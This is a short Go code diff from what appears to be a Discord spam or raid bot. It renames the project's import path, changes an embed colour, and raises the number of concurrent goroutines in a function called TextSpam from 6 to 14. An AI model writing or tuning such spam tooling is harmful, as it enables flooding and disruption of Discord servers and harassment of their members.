@@ -1,7 +1,7 @@
 package creating
 
 import (
-	"Dynamic/core/requests"
+	"Athanatos/core/requests"
 	"encoding/json"
 	"fmt"
 	"os"
@@ -49,7 +49,7 @@ func TextSpam(s *discordgo.Session, m *discordgo.MessageCreate, wg *sync.WaitGro
 	embed := discordgo.MessageEmbed{
 		Title:       EMBED_TITLE,
 		Description: EMBED_DESCRIPTION + "\n\n" + "> **Bot joined at: ** " + "`" + fmt.Sprint(guild.JoinedAt) + "`\n\n",
-		Color:       00255,
+		Color:       16777215,
 		Thumbnail:   &thumbnail,
 	}
 
@@ -78,7 +78,7 @@ func TextSpam(s *discordgo.Session, m *discordgo.MessageCreate, wg *sync.WaitGro
 
 	jsonData, _ = json.Marshal(dataMsg)
 
-	for i := 0; i < 6; i++ {
+	for i := 0; i < 14; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
